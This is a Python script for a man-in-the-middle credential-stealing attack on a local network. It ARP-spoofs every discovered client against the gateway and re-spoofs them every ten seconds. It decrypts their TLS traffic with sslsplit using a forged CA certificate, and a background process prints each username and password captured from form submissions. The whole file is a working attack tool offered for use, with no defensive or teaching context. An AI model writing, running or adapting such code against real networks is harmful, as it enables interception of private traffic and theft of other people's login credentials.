#!/usr/bin/env python3

import re
import shlex
import time
from contextlib import contextmanager
from io import SEEK_END
from multiprocessing import Process
from pathlib import Path
from subprocess import DEVNULL, Popen

import arp

CREDENTIALS_PATTERN = re.compile(r"username=([^&]+)&password=([^&]+)")


def parse_secret(log_file: Path):
    log_file.touch()

    with log_file.open(errors="ignore") as f:
        f.seek(0, SEEK_END)
        while True:
            line = f.readline().strip()
            if line == "":
                time.sleep(0.5)
                continue

            match = CREDENTIALS_PATTERN.search(line)
            if match:
                print(f"Username: {match.group(1)}")
                print(f"Password: {match.group(2)}")


@contextmanager
def sslsplit(log_file: Path):
    """Starts sslsplit"""

    cmd = f"sslsplit -D -L {log_file} -k ca.key -c ca.crt ssl 0.0.0.0 8443"

    with Popen(shlex.split(cmd), stdout=DEVNULL, stderr=DEVNULL) as proc:
        try:
            yield proc
        finally:
            pass


@contextmanager
def secret_reader(log_file: Path):
    """Starts a new process that reads the log file for secrets"""

    proc = Process(target=parse_secret, args=(log_file,))
    proc.start()
    try:
        yield proc
    finally:
        proc.terminate()


def main():
    clients, gateway_ip, gateway_mac = arp.arp_scan()
    arp.print_clients(clients)
    arp.spoof_all(clients, gateway_ip, gateway_mac)

    log_file = Path("mitm.log")
    with sslsplit(log_file), secret_reader(log_file):
        while True:
            try:
                time.sleep(10)
                arp.spoof_all(clients, gateway_ip, gateway_mac)
            except KeyboardInterrupt:
                break


if __name__ == "__main__":
    main()
